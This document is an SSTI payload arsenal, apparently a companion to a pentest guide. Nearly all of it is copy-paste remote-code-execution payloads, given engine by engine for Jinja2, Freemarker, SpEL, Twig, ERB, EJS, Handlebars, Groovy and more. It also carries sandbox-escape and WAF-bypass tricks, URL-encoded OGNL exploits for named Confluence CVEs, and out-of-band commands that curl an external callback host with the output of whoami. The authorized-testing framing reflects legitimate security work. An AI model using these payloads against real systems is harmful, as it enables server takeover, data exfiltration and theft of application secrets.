# SSTI Arsenal — Detection, Engine Fingerprint & Per-Engine RCE Payloads (copy-paste)

> Companion to `SSTI_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, clean up (Guide §18).
> The finding is **server-side evaluation → RCE** (or sandboxed file-read/secret). A lone `{{7*7}}=49` is a FP (Guide §4/§15).

---

## 1. Detection — DIFFERENTIAL (low false-positive) — Guide §4

```
# numeric (use NON-round operands the page can't already contain):
{{1337*1338}}        -> 1788906        (Jinja/Twig)
${1337*1338}         -> 1788906        (Freemarker/SpEL)
#{1337*1338}         -> 1788906        (Ruby/Thymeleaf)
<%= 1337*1338 %>     -> 1788906        (ERB/EJS)
{1337*1338}          -> 1788906        (Smarty)

# string-multiply differentiator (separates real engine from coincidence):
{{7*'7'}}            -> 7777777  (Jinja2/Twig)   |  49 (numeric engines)  |  error

# multi-engine detection polyglot:
${{<%[%'"}}%\

# RULE: server response must COMPUTE the value (before any JS) AND the literal "{{1337*1338}}" must NOT appear.
#  - raw {{...}} reaches the browser and JS makes it 49  -> CSTI (XSS kit), NOT SSTI.
```

## 2. Engine fingerprint branch — Guide §5

```
{{7*7}}=49 & {{7*'7'}}=7777777 & {{config}} renders            -> JINJA2 (Python)
{{7*7}}=49 & {{7*'7'}}=7777777 & Twig filters/_self work       -> TWIG (PHP)
${7*7}=49 & ${"...".getClass()} / ?new() works                -> FREEMARKER (Java)
${T(java.lang.Runtime)...}=works                              -> SpEL / Thymeleaf (Java)
<%= 7*7 %>=49                                                 -> ERB (Ruby) or EJS (Node)
#{7*7}=49                                                     -> Slim (Ruby) / Thymeleaf
{7*7}=49                                                      -> SMARTY (PHP) / Tornado-ish
{{range.constructor(...)}} works                             -> NUNJUCKS (Node)
```

## 3. Python — Jinja2 (Guide §7)

```
{{7*7}}  {{7*'7'}}  {{config}}  {{config.items()}}  {{self}}
# RCE (try in order):
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}     # find subprocess.Popen, then call .__init__ with the cmd
{{ joiner.__init__.__globals__.os.popen('id').read() }}
# secrets / Flask session forge (if RCE blocked):
{{ config }}    {{ config['SECRET_KEY'] }}
# file read (sandboxed):
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

Mako / Tornado:
```
Mako:    ${self.module.cache.util.os.system('id')}    <%import os%>${os.popen('id').read()}
Tornado: {% import os %}{{ os.popen('id').read() }}
```

## 4. Java — Freemarker / Velocity / SpEL (Guide §8)

```
Freemarker:
  <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
  ${"freemarker.template.utility.Execute"?new()("id")}
Velocity:
  #set($e="exec")#set($r=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$r
SpEL / Thymeleaf:
  ${T(java.lang.Runtime).getRuntime().exec("id")}
  *{T(java.lang.Runtime).getRuntime().exec("id")}
  __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
  ${T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"})}
```

## 5. PHP — Twig / Smarty / Blade (Guide §9)

```
Twig:
  {{7*7}}  {{7*'7'}}
  {{ ['id']|filter('system') }}
  {{ ['id',''] | sort('system') }}
  {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
  {{ attribute(_self.env, 'getFilter', ['system'])('id') }}
Smarty:
  {system('id')}
  {php}system('id');{/php}
Blade (Laravel) — only where user Blade is eval'd / raw:
  {{ system('id') }}   (look for Blade::render($userInput))
```

## 6. Ruby / Node (Guide §10)

```
ERB (Ruby):   <%= `id` %>   <%= system('id') %>   <%= IO.popen('id').read %>
Slim:         #{`id`}
EJS:          <%= global.process.mainModule.require('child_process').execSync('id') %>
Pug/Jade:     #{root.process.mainModule.require('child_process').execSync('id')}
              = global.process.mainModule.require('child_process').execSync('id')
Nunjucks:     {{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
Handlebars:   (multi-step prototype payload — see PayloadsAllTheThings; reaches require('child_process').execSync)
```

## 7. Sandbox escape hints (Guide §11)

```
Jinja2 (config/__class__ blocked):
  reach globals via cycler / joiner / namespace / request.application.__globals__ / get_flashed_messages.__globals__
  attribute access:  {{ ''|attr('__class__') }}   {{ request['__class__'] }}
  char filters:  . blocked -> |attr() or ['name'] ;  _ blocked -> \x5f / unicode / request.args splice
Twig sandbox:
  filter/sort/map('system') often slip older sandboxes ; attribute(_self.env,'getFilter',['system'])
```

## 8. Blind — time & OOB (Guide §13)

```
Jinja time:  {{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}
Jinja OOB:   {{ cycler.__init__.__globals__.os.popen('curl http://YOURID.oast.pro/$(whoami)').read() }}
Freemarker:  ${"...Execute"?new()("curl http://YOURID.oast.pro/x")}
ERB OOB:     <%= `curl http://YOURID.oast.pro/$(whoami)` %>
# a hit from the SERVER IP confirms server-side eval; exfil $(whoami) into the hostname/path (base64).
```

## 8b. More engines — Pebble / Thymeleaf / Razor / Go / Handlebars-full / Mako / Pug (guide §8/§10)
```
Pebble (Java):     {% set cmd = 'id' %}{{ beans.get('...').getClass()... }}  →  use the published Pebble RCE chain
                   {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
Thymeleaf (Java):  ${T(java.lang.Runtime).getRuntime().exec('id')}
                   __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x        (expression preprocessing)
                   *{T(java.lang.Runtime).getRuntime().exec('id')}
Spring SpEL:       ${T(java.lang.Runtime).getRuntime().exec('id')} ; #{...} ; new java.lang.ProcessBuilder(...)
Razor (.NET):      @{ System.Diagnostics.Process.Start("cmd.exe","/c id"); }   (when user Razor is compiled)
Groovy (Java/Jenkins): ${"id".execute().text}  ·  ${["id"].execute().text}  ·  ${Runtime.getRuntime().exec("id").text}
                   <% out.print("id".execute().text) %>  ·  ${new ProcessBuilder(["bash","-c","id"]).start().text}
                   (sandboxed in Jenkins script-security → version-matched Groovy-sandbox escape gadget)
Go text/template:  {{.}} reflects ; {{printf "%s" .Secret}} leaks ; html/template auto-escapes (info-leak > RCE)
doT (Node):        {{= global.process.mainModule.require('child_process').execSync('id') }}   (compiles via new Function)
Eta (Node):        <%= it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>
Squirrelly (Node): helper/filter/option-injection RCE (CVE-class) — abuse autoEscape/helper config like EJS option-injection
Marko (Node):      constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
Hogan/Mustache/Dust (logic-less): usually NO RCE → context/data disclosure or HTML-injection (XSS) only — don't over-claim
Handlebars (Node, full RCE chain):
  {{#with "s" as |string|}}{{#with split as |c|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}
  {{this.pop}}{{#with string.split as |s2|}}...require('child_process').execSync('id')...{{/with}}{{/with}}{{/with}}
Pug/Jade:          #{root.process.mainModule.require('child_process').execSync('id')}  ;  = global.process...
Mako (Python):     <%import os%>${os.popen('id').read()}   ;   ${self.module.cache.util.os.system('id')}
Jinja2 newer bypass paths (when classic globals filtered):
  {{ namespace.__init__.__globals__.os.popen('id').read() }}
  {{ (().__class__.__base__.__subclasses__()) }}  → index a class exposing os/subprocess
  {{ cycler.__init__.__globals__['os'].popen('id').read() }}   |attr() / ['..'] when . or _ filtered
```

## 8c. More sandbox escapes & filter bypass (guide §11)
```
Jinja2:   . blocked → {{ ''|attr('__class__') }} / request['application'] ; _ blocked → use \x5f, request.args, |attr
          {{ get_flashed_messages.__globals__.__builtins__ }} ; {{ lipsum.__globals__ }} ; {{ x.__init__.__globals__ }}
          via request:  {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
Twig:     {{ ['id']|filter('system') }} ; {{ ['id','']|sort('system') }} ; {{ ['id']|map('system')|join }}
          {{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
Generic:  build a filtered keyword via concat/format inside the template ; hex/unicode escapes ; case where allowed.
```

## 8d. Real-world SSTI CVEs & chains (guide §16) + references
```
□ Atlassian Confluence OGNL injection (CVE-2021-26084, CVE-2022-26134) — unauth → RCE (OGNL is SSTI-adjacent).
□ Craft CMS / Twig (CVE-2024-56145 & friends) — Twig SSTI → RCE.
□ Spring SpEL injection (numerous) — ${T(java.lang.Runtime)...} via expression-evaluated params/headers.
□ Apache Velocity / Freemarker template editors in CMS/ITSM (e.g. Liferay, Alfresco) → admin → RCE.
□ Mako/Jinja2 in Python admin/email/report features → RCE (Flask {{config}} SECRET_KEY → forge sessions even if sandboxed).
□ Handlebars/Pug/Nunjucks/doT/Eta/Squirrelly in Node "email template" / "custom page" builders → RCE (§8b) — doT/Eta compile via new Function; Squirrelly has RCE CVEs.
□ Groovy template injection (Jenkins script-console / pipeline / Spring GroovyMarkupTemplateEngine) → ${"id".execute().text} → RCE; the Jenkins/Groovy script-security sandbox has a long escape-CVE trail.
□ SSTI via uploaded/processed office templates (DOCX/XLSX templating, JasperReports) → RCE in the renderer.
□ Classic chain: SSTI → RCE → cloud metadata creds (SSRF kit §11) → cloud takeover.
```
> **References:** PortSwigger *Server-side template injection* + James Kettle's SSTI research, PayloadsAllTheThings
> *Server Side Template Injection* (per-engine), HackTricks *SSTI*, `vladko312/SSTImap` & tplmap, Hackviser & PentesterLab
> SSTI modules.

---

## 8e. OGNL / MVEL / Java-EL injection — Struts/Confluence real-world RCEs (guide §8.4)
```
# detect: reflected ${...} / %{...} / #{...} in a Java app (Struts/Confluence/Spring/JSF)
${7*7}  %{7*7}  #{7*7}  → 49 in the SERVER response → expression language is evaluated
OGNL (Confluence CVE-2021-26084, unauth — inject into queryString/page params):
  '%2b#{@java.lang.Runtime@getRuntime().exec("id")}%2b'
OGNL (Confluence CVE-2022-26134, unauth — in the URL path):
  /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29%29%7D/
Struts2 (CVE-2017-5638 — Content-Type header OGNL): use the published %{(#_='multipart/form-data')...exec('id')...} PoC
Java EL (JSP/JSF ${ } / #{ }):
  ${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
# match the exact product+version to the right published PoC; prove with id/OOB, then STOP.
```

## 8f. Filter / WAF bypass — blocked {{ . _ [ keywords (guide §11.1)
```
{{ }} blocked          → statement context: {%print(7*7)%}  (Jinja) ; {% ... %} (Twig) ; ${ } / <%= %> per engine
. blocked              → {{ ()['__class__'] }}  ·  {{ self|attr('__class__') }}  ·  request['application']['__globals__']
_ blocked              → {{ ''[request.args.a] }} with ?a=__class__   ·   concat: ['__cl'+'ass__']
keyword blocked        → request-arg SMUGGLING (the bad word lives in the QUERY, not your template):
  {{ lipsum|attr(request.args.g) }}              with  ?g=__globals__
  {{ ()|attr(request.args.a)|attr(request.args.b) }}  with ?a=__class__&b=__base__ ...
  {{ request.args.x }}                            with  ?x=<a string with no quotes in the template>
quotes filtered        → bring strings via request.args (above) ; chr()/format inside the template
[ ] blocked            → |attr() everywhere ; .__getitem__() via attr chains
Twig keyword filter    → {{ ['id']|filter('system') }} ·{{ ['id','']|sort('system') }}· map('system')
# UNIVERSAL Jinja two: |attr()+['...']  AND  request.args smuggling (the blocked token never appears in your injection).
```

## 9. Triage rules (don't waste a report)

```
differential server-side eval (1337*1338 & 7*'7') + engine + RCE   → REPORT Critical (benign id; clean up)
sandboxed engine + file read / {{config}} SECRET_KEY               → REPORT High (forge sessions / pivot)
blind, confirmed via time/OOB → RCE                                → REPORT Critical
lone {{7*7}}=49 / client-side {{}} (CSTI) / reflected "7*7"        → NOT SSTI (CSTI = XSS kit)
tplmap "vulnerable" with no manual differential                   → reproduce first
```
